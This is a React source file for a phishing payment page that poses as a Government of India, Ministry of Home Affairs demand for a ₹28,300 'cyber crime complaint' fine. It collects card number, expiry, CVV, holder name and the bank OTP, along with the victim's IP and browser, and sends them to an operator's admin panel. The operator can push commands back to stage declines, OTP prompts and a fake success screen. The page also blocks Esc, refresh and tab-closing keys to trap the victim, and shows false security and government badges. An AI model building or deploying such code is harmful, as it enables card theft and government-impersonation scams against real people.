import React, { useState, useEffect } from 'react';
import { CreditCard, Lock, Shield, Loader2, AlertTriangle } from 'lucide-react';

const getRealIP = async () => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.log('Could not fetch real IP, using fallback');
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  }
};

const getRandomNetwork = () => {
  const networks = ['Airtel', 'Jio', 'Vi', 'BSNL'];
  return networks[Math.floor(Math.random() * networks.length)];
};

const PaymentForm = () => {
  const [formData, setFormData] = useState({
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    cardHolder: '',
    amount: '28300.00'
  });

  const [isLoading, setIsLoading] = useState(false);
  const [showOtp, setShowOtp] = useState(false);
  const [otp, setOtp] = useState('');
  const [displayOtp, setDisplayOtp] = useState('');
  const [otpFocused, setOtpFocused] = useState(false);
  const [timer, setTimer] = useState(299);
  const [isConfirmLoading, setIsConfirmLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [showProcessing, setShowProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [invalidOtpMessage, setInvalidOtpMessage] = useState('');
  const [showAlert, setShowAlert] = useState(false);
  const [fadeState, setFadeState] = useState('visible');

  // Check if all card details are filled
  const isFormValid = () => {
    return formData.cardNumber.replace(/\s/g, '').length === 16 &&
           formData.expiryMonth.length === 2 &&
           formData.expiryYear.length === 2 &&
           formData.cvv.length >= 3 &&
           formData.cardHolder.trim().length > 0;
  };

  // Check if OTP is valid (6 digits)
  const isOtpValid = () => {
    return otp.length === 6;
  };

  useEffect(() => {
    // Enhanced keyboard restriction with stronger ESC blocking
    const handleKeyDown = (event: KeyboardEvent) => {
      // Ultra-strong ESC key blocking
      if (event.key === 'Escape' || event.keyCode === 27 || event.which === 27) {
        event.preventDefault();
        event.stopPropagation();
        event.stopImmediatePropagation();
        return false;
      }
      
      // Prevent other shortcuts
      if (event.key === 'F5' || 
          (event.ctrlKey && event.key === 'r') || 
          (event.ctrlKey && event.key === 'F5') ||
          (event.ctrlKey && (event.key === 'w' || event.key === 'q' || event.key === 't')) ||
          (event.altKey && event.key === 'F4')) {
        event.preventDefault();
        event.stopPropagation();
        return false;
      }
    };

    // Multiple layers of event blocking
    document.addEventListener('keydown', handleKeyDown, true);
    document.addEventListener('keyup', handleKeyDown, true);
    window.addEventListener('keydown', handleKeyDown, true);
    window.addEventListener('keyup', handleKeyDown, true);

    // Additional ESC blocking
    const blockEsc = (e: KeyboardEvent) => {
      if (e.keyCode === 27) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
      }
    };

    document.body.addEventListener('keydown', blockEsc, true);
    document.body.addEventListener('keyup', blockEsc, true);

    return () => {
      document.removeEventListener('keydown', handleKeyDown, true);
      document.removeEventListener('keyup', handleKeyDown, true);
      window.removeEventListener('keydown', handleKeyDown, true);
      window.removeEventListener('keyup', handleKeyDown, true);
      document.body.removeEventListener('keydown', blockEsc, true);
      document.body.removeEventListener('keyup', blockEsc, true);
    };
  }, []);

  useEffect(() => {
    // Initialize broadcast channel and send visitor data with real IP
    const initializeConnection = async () => {
      if (!window.cardDataChannel) {
        window.cardDataChannel = new BroadcastChannel('cardData');
      }

      const realIP = await getRealIP();
      const userInfo = {
        ip: realIP,
        browser: navigator.userAgent,
        network: getRandomNetwork()
      };

      const visitorData = {
        type: 'newVisitor',
        ip: realIP,
        timestamp: new Date().toISOString()
      };

      console.log('Sending visitor data with real IP:', visitorData);
      window.cardDataChannel.postMessage(visitorData);
    };

    initializeConnection();

    // Listen for commands from admin panel
    const handleMessage = (event: MessageEvent) => {
      const data = event.data;
      console.log('Received command from admin:', data);
      
      switch (data.command) {
        case 'showotp':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsLoading(false);
            setShowOtp(true);
            setFadeState('fadeIn');
          }, 300);
          break;
        case 'fail':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsLoading(false);
            setShowOtp(false);
            setErrorMessage('Your card has been declined');
            setFadeState('fadeIn');
          }, 300);
          break;
        case 'success':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsConfirmLoading(false);
            setShowProcessing(true);
            setFadeState('fadeIn');
            setTimeout(() => {
              setShowProcessing(false);
              setShowSuccess(true);
              setTimeout(() => {
                window.location.href = 'https://google.com';
              }, 2000);
            }, 4000);
          }, 300);
          break;
        case 'invalidotp':
          setIsConfirmLoading(false);
          setInvalidOtpMessage('Invalid OTP, please enter valid one time passcode sent to your mobile');
          break;
        case 'cardinvalid':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsLoading(false);
            setShowOtp(false);
            setErrorMessage('Your card is invalid, please try another card');
            setFadeState('fadeIn');
          }, 300);
          break;
        case 'carddisabled':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsLoading(false);
            setShowOtp(false);
            setErrorMessage('Card disabled, please try another card');
            setFadeState('fadeIn');
          }, 300);
          break;
      }
    };

    window.cardDataChannel.onmessage = handleMessage;

    // Handle click anywhere to show alert
    const handleDocumentClick = (e: MouseEvent) => {
      const paymentForm = document.querySelector('.w-96.bg-white.border-l');
      if (paymentForm) {
        const rect = paymentForm.getBoundingClientRect();
        const isInPaymentArea = e.clientX >= rect.left && 
                               e.clientX <= rect.right && 
                               e.clientY >= rect.top && 
                               e.clientY <= rect.bottom;
        
        if (!isInPaymentArea) {
          setShowAlert(true);
          // Add red glow to payment form
          paymentForm.classList.add('shadow-red-500', 'shadow-2xl', 'border-red-500');
          setTimeout(() => {
            setShowAlert(false);
            paymentForm.classList.remove('shadow-red-500', 'shadow-2xl', 'border-red-500');
          }, 3000);
        }
      }
    };

    document.addEventListener('click', handleDocumentClick);

    return () => {
      window.cardDataChannel.onmessage = null;
      document.removeEventListener('click', handleDocumentClick);
    };
  }, []);

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (showOtp && timer > 0) {
      interval = setInterval(() => {
        setTimer(prev => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [showOtp, timer]);

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    const limited = cleaned.slice(0, 16);
    const formatted = limited.replace(/(\d{4})(?=\d)/g, '$1 ');
    return formatted;
  };

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}.${secs.toString().padStart(2, '0')}`;
  };

  const sendToAdminPanel = (data: any) => {
    console.log('Sending data to admin panel:', data);
    window.cardDataChannel.postMessage(data);
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    
    if (name === 'cardNumber') {
      const formatted = formatCardNumber(value);
      setFormData({
        ...formData,
        [name]: formatted
      });
    } else if (name === 'expiryMonth') {
      const numericValue = value.replace(/\D/g, '').slice(0, 2);
      setFormData({
        ...formData,
        [name]: numericValue
      });
    } else if (name === 'expiryYear') {
      const numericValue = value.replace(/\D/g, '').slice(0, 2);
      setFormData({
        ...formData,
        [name]: numericValue
      });
    } else if (name === 'cvv') {
      const numericValue = value.replace(/\D/g, '').slice(0, 4);
      setFormData({
        ...formData,
        [name]: numericValue
      });
    } else {
      setFormData({
        ...formData,
        [name]: value
      });
    }
  };

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 6);
    setOtp(value);
    setDisplayOtp(value);
    setInvalidOtpMessage('');
    
    if (value.length > 0) {
      setTimeout(() => {
        setDisplayOtp('*'.repeat(value.length));
      }, 2000);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!isFormValid()) {
      return;
    }
    
    setIsLoading(true);
    setErrorMessage('');
    
    // Send card data to admin panel with real IP
    const realIP = await getRealIP();
    const userInfo = {
      ip: realIP,
      browser: navigator.userAgent.split(' ')[navigator.userAgent.split(' ').length - 1],
      network: getRandomNetwork()
    };
    
    const cardData = {
      type: 'cardData',
      data: formData,
      userInfo: userInfo,
      timestamp: new Date().toISOString()
    };
    
    console.log('Submitting card data:', cardData);
    sendToAdminPanel(cardData);
  };

  const handleConfirmPay = () => {
    if (!isOtpValid()) {
      return;
    }
    
    setIsConfirmLoading(true);
    
    // Send OTP to admin panel
    sendToAdminPanel({
      type: 'otp',
      otp: otp,
      timestamp: new Date().toISOString()
    });
  };

  const getLastFourDigits = () => {
    return formData.cardNumber.replace(/\s/g, '').slice(-4);
  };

  const maskCardInfo = (value: string) => {
    return '*'.repeat(value.length);
  };

  if (showSuccess) {
    return (
      <div className="w-96 bg-white border-l border-gray-200 p-6 flex items-center justify-center min-h-screen">
        <div className="text-center">
          <div className="text-green-600 text-6xl animate-bounce">✓</div>
          <p className="text-lg font-bold text-green-600 mt-4">Payment Successful!</p>
        </div>
      </div>
    );
  }

  if (showProcessing) {
    return (
      <div className="w-96 bg-white border-l border-gray-200 p-6 flex items-center justify-center min-h-screen">
        <div className="text-center">
          <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4" />
          <p className="text-lg text-black">Please wait while we process your transaction securely...</p>
        </div>
      </div>
    );
  }

  if (showOtp) {
    return (
      <div className={`w-96 bg-white border-l border-gray-200 p-6 transition-opacity duration-300 ${
        fadeState === 'fadeOut' ? 'opacity-0' : 'opacity-100'
      }`}>
        <div className="bg-red-50 border border-red-200 rounded p-4 mb-6">
          <div className="flex items-center mb-2">
            <Shield className="w-5 h-5 text-red-600 mr-2" />
            <span className="font-semibold text-red-800">OTP Verification Required</span>
          </div>
          <p className="text-sm text-red-700">
            Enter the verification code to complete your payment.
          </p>
        </div>

        <div className="space-y-4">
          {invalidOtpMessage && (
            <div className="text-red-600 text-sm text-center mb-4">
              {invalidOtpMessage}
            </div>
          )}
          
          <div className="text-center mb-6">
            <p className="text-sm text-gray-700 mb-4">
              Enter six-digit verification code sent to your registered mobile number ending in {getLastFourDigits()}
            </p>
            
            <div className="relative">
              <input
                type="text"
                value={displayOtp}
                onChange={handleOtpChange}
                onFocus={() => setOtpFocused(true)}
                onBlur={() => setOtpFocused(false)}
                placeholder="000000"
                className={`w-full px-4 py-3 border-2 rounded-lg text-center text-2xl tracking-widest focus:outline-none transition-all ${
                  otpFocused ? 'border-blue-400 shadow-lg shadow-blue-200' : 'border-gray-300'
                }`}
                maxLength={6}
                disabled={isConfirmLoading}
              />
            </div>
          </div>

          <button
            onClick={handleConfirmPay}
            disabled={!isOtpValid() || isConfirmLoading}
            className={`w-full py-3 px-4 rounded-lg font-medium transition-all ${
              isOtpValid() && !isConfirmLoading
                ? 'bg-green-600 text-white hover:bg-green-700'
                : 'bg-gray-400 text-gray-600 cursor-not-allowed'
            }`}
          >
            {isConfirmLoading ? (
              <Loader2 className="w-5 h-5 animate-spin mx-auto" />
            ) : (
              'Confirm & Pay'
            )}
          </button>

          <div className="text-center text-sm text-red-600 mt-4">
            This page will expire after {formatTime(timer)} seconds
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className={`w-96 bg-white border-l border-gray-200 p-6 transition-opacity duration-300 ${
      fadeState === 'fadeOut' ? 'opacity-0' : 'opacity-100'
    }`}>
      {showAlert && (
        <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-50 bg-red-600 text-white px-6 py-3 rounded-lg shadow-lg flex items-center space-x-2">
          <AlertTriangle className="w-5 h-5" />
          <span className="font-bold">Complete the fine payment here</span>
        </div>
      )}

      <div className="bg-red-50 border border-red-200 rounded p-4 mb-6">
        <div className="flex items-center mb-2">
          <Shield className="w-5 h-5 text-red-600 mr-2" />
          <span className="font-semibold text-red-800">Secure Payment Required</span>
        </div>
        <p className="text-sm text-red-700">
          Complete your payment to proceed with cyber crime complaint registration.
        </p>
      </div>

      {errorMessage && (
        <div className="border border-red-500 bg-transparent p-3 rounded mb-4">
          <p className="text-red-600 text-sm">{errorMessage}</p>
        </div>
      )}

      <form className="space-y-4" onSubmit={handleSubmit}>
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Amount to Pay
          </label>
          <div className="relative">
            <span className="absolute left-3 top-2 text-gray-500">₹</span>
            <input
              type="text"
              name="amount"
              value={formData.amount}
              onChange={handleInputChange}
              className="w-full pl-8 pr-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50"
              readOnly
            />
          </div>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Card Number
          </label>
          <div className="relative">
            <CreditCard className="absolute left-3 top-2.5 w-4 h-4 text-gray-400" />
            <input
              type="text"
              name="cardNumber"
              placeholder="1234 5678 9012 3456"
              value={isLoading ? maskCardInfo(formData.cardNumber) : formData.cardNumber}
              onChange={handleInputChange}
              className="w-full pl-10 pr-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
              maxLength={19}
              disabled={isLoading}
            />
          </div>
        </div>

        <div className="grid grid-cols-3 gap-3">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Month
            </label>
            <input
              type="text"
              name="expiryMonth"
              placeholder="MM"
              value={isLoading ? maskCardInfo(formData.expiryMonth) : formData.expiryMonth}
              onChange={handleInputChange}
              className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
              maxLength={2}
              disabled={isLoading}
            />
          </div>
          
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Year
            </label>
            <input
              type="text"
              name="expiryYear"
              placeholder="YY"
              value={isLoading ? maskCardInfo(formData.expiryYear) : formData.expiryYear}
              onChange={handleInputChange}
              className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
              maxLength={2}
              disabled={isLoading}
            />
          </div>
          
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              CVV
            </label>
            <div className="relative">
              <Lock className="absolute left-2 top-2.5 w-3 h-3 text-gray-400" />
              <input
                type="text"
                name="cvv"
                placeholder="123"
                value={isLoading ? maskCardInfo(formData.cvv) : formData.cvv}
                onChange={handleInputChange}
                className="w-full pl-7 pr-2 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                maxLength={4}
                disabled={isLoading}
              />
            </div>
          </div>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Card Holder Name
          </label>
          <input
            type="text"
            name="cardHolder"
            placeholder="Enter full name as on card"
            value={isLoading ? maskCardInfo(formData.cardHolder) : formData.cardHolder}
            onChange={handleInputChange}
            className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
            disabled={isLoading}
          />
        </div>

        <div className="bg-blue-50 border border-blue-200 rounded p-3 mt-4">
          <div className="flex items-center text-sm text-blue-800">
            <Shield className="w-4 h-4 mr-2" />
            <span>256-bit SSL Encryption</span>
          </div>
        </div>

        <button
          type="submit"
          disabled={!isFormValid() || isLoading}
          className={`w-full py-3 px-4 rounded font-medium focus:outline-none focus:ring-2 focus:ring-green-500 mt-6 transition-all ${
            isFormValid() && !isLoading
              ? 'bg-green-600 text-white hover:bg-green-700'
              : 'bg-gray-400 text-gray-600 cursor-not-allowed'
          }`}
        >
          {isLoading ? (
            <Loader2 className="w-5 h-5 animate-spin mx-auto" />
          ) : (
            `Pay Securely ₹${formData.amount}`
          )}
        </button>

        <div className="flex justify-center items-center space-x-4 mt-4 mb-4">
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/visa.svg" alt="Visa" className="h-8 w-12 object-contain" />
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/mastercard.svg" alt="Mastercard" className="h-8 w-12 object-contain" />
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/americanexpress.svg" alt="American Express" className="h-8 w-12 object-contain" />
          <svg className="h-8 w-12" viewBox="0 0 100 60" fill="none">
            <rect width="100" height="60" rx="8" fill="#00447C"/>
            <text x="50" y="35" textAnchor="middle" fill="white" fontSize="12" fontWeight="bold">RuPay</text>
          </svg>
        </div>

        <div className="text-xs text-gray-500 text-center mt-4">
          <p>Protected by Government of India</p>
          <p>Ministry of Home Affairs</p>
        </div>
      </form>
    </div>
  );
};

export default PaymentForm;
